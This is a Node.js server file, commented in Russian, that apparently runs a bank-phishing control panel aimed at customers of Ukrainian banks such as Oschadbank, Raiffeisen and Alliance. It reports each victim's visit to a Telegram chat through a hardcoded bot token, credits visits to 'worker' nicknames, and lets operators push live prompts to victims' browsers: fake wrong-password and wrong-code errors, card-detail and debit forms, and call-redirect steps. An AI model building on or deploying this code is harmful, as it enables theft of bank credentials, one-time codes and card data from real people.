// index.js
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');
const path = require('path');
const { atob } = require('buffer');

// --- КОНФИГУРАЦИЯ ---
const TELEGRAM_BOT_TOKEN = '8383351361:AAF8fhC3zwfegB2lF6hlwqw2U5UozpGxn_k';
const CHAT_ID = '-4961970994';
const PORT = process.env.PORT || 3000;
const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
const webhookPath = `/bot${TELEGRAM_BOT_TOKEN}`;
const WEBHOOK_URL = RENDER_EXTERNAL_URL ? (RENDER_EXTERNAL_URL + webhookPath) : null;

// --- ИНИЦИАЛИЗАЦИЯ ---
const app = express();
app.use(express.json());
app.use(cors());

// Логирование запросов (без IP)
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
    next();
});

// --------------------
// Инициализация Telegram бота — ДОЛЖНА БЫТЬ ПЕРЕД маршрутом /click и другими, где используется bot
// --------------------
let bot;
try {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
    console.log('TelegramBot объект создан.');
} catch (err) {
    console.error('Ошибка создания TelegramBot:', err);
}

// Установка вебхука (если есть RENDER_EXTERNAL_URL)
if (bot && WEBHOOK_URL) {
    bot.setWebHook(WEBHOOK_URL)
        .then(() => console.log(`Webhook установлен на ${WEBHOOK_URL}`))
        .catch(err => console.error('Ошибка установки вебхука:', err));
    bot.sendMessage(CHAT_ID, '✅ Бот перезапущен и готов к работе!', { parse_mode: 'HTML' })
        .catch(err => console.error('Ошибка отправки стартового сообщения в Telegram:', err));
} else if (!WEBHOOK_URL) {
    console.log('RENDER_EXTERNAL_URL не задан — вебхук не устанавливается. Используется sendMessage по HTTPS.');
}

// Проверка статуса бота
if (bot) {
    bot.getMe()
        .then(me => console.log(`Бот запущен: @${me.username}`))
        .catch(err => console.error('Ошибка инициализации бота (getMe):', err));
}

// --------------------
// Простые маршруты / статика
// --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});
app.get('/panel', (req, res) => {
    res.sendFile(path.join(__dirname, 'panel.html'));
});

// Тестовый эндпоинт для проверки сервера
app.get('/ping', (req, res) => res.json({ ok: true, time: new Date().toISOString() }));

// --- ЭНДПОИНТ ДЛЯ УВЕДОМЛЕНИЙ О ПЕРЕХОДАХ ---
// Вызови: GET /click?path=/some/page&sessionId=abc&referrer=base64nick
// Этот эндпоинт НЕ собирает/не отправляет IP — только мета(время, путь, sessionId, referrer/ник)
app.get('/click', (req, res) => {
    try {
        if (!bot) {
            console.error('Bot не инициализирован, не могу отправить сообщение в Telegram.');
            return res.status(500).json({ message: 'Bot not initialized' });
        }

        const pagePath = req.query.path || req.path || 'не указан';
        const sessionId = req.query.sessionId || 'не указан';
        let workerNick = 'unknown';
        const referrer = req.query.referrer;

        try {
            if (referrer && referrer !== 'unknown') {
                // если referrer — base64 ник
                workerNick = atob(referrer);
            }
        } catch (e) {
            console.error('Ошибка декодирования referrer:', e);
        }

        const timestamp = new Date().toLocaleString();
        const message = `<b>🆕 НОВЫЙ ПЕРЕХОД</b>\n\n` +
                        `<b>Время:</b> ${timestamp}\n` +
                        `<b>Страница / путь:</b> <code>${pagePath}</code>\n` +
                        `<b>SessionId:</b> <code>${sessionId}</code>\n` +
                        `<b>Worker:</b> @${workerNick}\n`;

        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' })
            .then(() => {
                console.log('Уведомление отправлено в Telegram:', { pagePath, sessionId, workerNick });
                res.status(200).json({ message: 'NOTIFIED' });
            })
            .catch(err => {
                console.error('Ошибка отправки уведомления в Telegram:', err);
                res.status(500).json({ message: 'ERROR', error: String(err) });
            });
    } catch (err) {
        console.error('Ошибка в /click:', err);
        res.status(500).json({ message: 'ERROR', error: String(err) });
    }
});

// --- ИНИЦИАЛИЗАЦИЯ WEBSOCKET ---
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });
const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('Клиент подключился по WebSocket');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Клиент зарегистрирован: ${data.sessionId}`);
            }
        } catch (e) {
            console.error('Ошибка обработки WebSocket сообщения:', e);
        }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Клиент отключился: ${sessionId}`);
            }
        });
    });
    ws.on('error', (error) => console.error('Ошибка WebSocket:', error));
});

// --- ОБРАБОТКА CALLBACK QUERY ОТ TELEGRAM ---
// (оставляем как было — использует переменные clients/sessions и bot)
if (bot) {
    bot.on('callback_query', (callbackQuery) => {
        const [type, sessionId] = callbackQuery.data.split(':');
        const ws = clients.get(sessionId);

        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error(`Ошибка: Клиент ${sessionId} не в сети`);
            bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка: клиент не в сети!', show_alert: true });
            return;
        }

        const sessionData = sessions.get(sessionId) || {};
        let command = { type, data: {} };
        let responseText = `Команда "${type}" отправлена!`;

        switch (type) {
            case 'lk':
            case 'call':
            case 'ban':
                break;
            case 'number_error':
                command.type = 'number_error';
                command.data = { loginType: sessionData.loginMethod || 'phone' };
                responseText = 'Запрос "неверный номер" отправлен!';
                break;
            case 'telegram_debit':
                command.type = sessionData.bankName === 'Ощадбанк' ? 'telegram_debit' : 'show_debit_form';
                break;
            case 'password_error':
                if (sessionData.bankName === 'Райффайзен') {
                    command.type = 'raiff_pin_error';
                    responseText = 'Запрос "неверный пароль" отправлен!';
                } else {
                    command.type = 'password_error';
                    command.data = { loginType: sessionData.loginMethod || 'phone' };
                    responseText = 'Запрос "неверный пароль" отправлен!';
                }
                break;
            case 'client_not_found':
                command.type = 'client_not_found';
                responseText = 'Запрос "Клиент не найден" отправлен!';
                break;
            case 'code_error':
                if (sessionData.bankName === 'Райффайзен') {
                    command.type = 'raiff_code_error';
                } else if (sessionData.bankName === 'Ощадбанк') {
                    command.type = 'code_error';
                } else {
                    command.type = 'generic_debit_error';
                }
                responseText = 'Запрос "неверный код" отправлен!';
                break;
            case 'request_details':
                if (sessionData.bankName === 'Альянс') {
                    command.type = 'request_alliance_card_details';
                } else if (sessionData.bankName !== 'Ощадбанк') {
                    command.type = 'show_card_details_form';
                } else {
                    bot.answerCallbackQuery(callbackQuery.id, { text: 'Команда "Запрос" не применима для Ощадбанка', show_alert: true });
                    return;
                }
                responseText = `Запрос деталей карты (${sessionData.bankName}) отправлен!`;
                break;
            case 'other':
                command.data = { text: "По техническим причинам данный банк временно недоступен. Пожалуйста, выберите другой." };
                break;
            case 'viber_call':
                command.type = 'viber';
                responseText = 'Запрос Viber 📞 отправлен!';
                break;
            case 'redirect_call':
                command.type = 'redirect_call';
                responseText = 'Запрос Переадресация 📞 отправлен!';
                break;
            case 'recovery':
                command.type = 'recovery';
                responseText = 'Запрос "Восстановление" отправлен!';
                break;
            default:
                console.error(`Неизвестная команда: ${type}`);
                bot.answerCallbackQuery(callbackQuery.id, { text: `Неизвестная команда: ${type}`, show_alert: true });
                return;
        }

        try {
            ws.send(JSON.stringify(command));
            bot.answerCallbackQuery(callbackQuery.id, { text: responseText });
            console.log(`Команда ${type} отправлена клиенту ${sessionId}`);
        } catch (error) {
            console.error(`Ошибка отправки команды ${type} клиенту ${sessionId}:`, error);
            bot.answerCallbackQuery(callbackQuery.id, { text: '❗️ Ошибка отправки команды!', show_alert: true });
        }
    });
}

// --- ОБРАБОТКА API SUBMIT и SMS ---
// (я не менял логику — просто поместил ниже; скопируй свои существующие обработчики сюда)
app.post('/api/submit', (req, res) => {
    // ... ваш существующий код обработки /api/submit ...
    res.status(200).json({ message: 'OK (заглушка)' });
});
app.post('/api/sms', (req, res) => {
    // ... ваш существующий код обработки /api/sms ...
    res.status(200).json({ message: 'OK (заглушка)' });
});

// --- ЗАПУСК СЕРВЕРА ---
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Сервер запущен на порту ${PORT}`);
});
